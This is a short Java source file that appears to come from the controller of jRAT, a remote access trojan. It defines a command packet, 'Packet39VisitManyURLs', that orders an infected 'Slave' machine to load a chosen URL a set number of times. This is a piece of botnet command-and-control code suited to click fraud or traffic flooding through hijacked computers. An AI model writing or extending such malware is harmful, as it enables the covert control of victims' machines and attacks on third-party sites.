package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet39VisitManyURLs implements OutgoingPacket {

	private String url;
	private int times;

	public Packet39VisitManyURLs(String url, int times) {
		this.url = url;
		this.times = times;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(url);
		slave.writeInt(times);
	}

	@Override
	public short getPacketId() {
		return 39;
	}

}
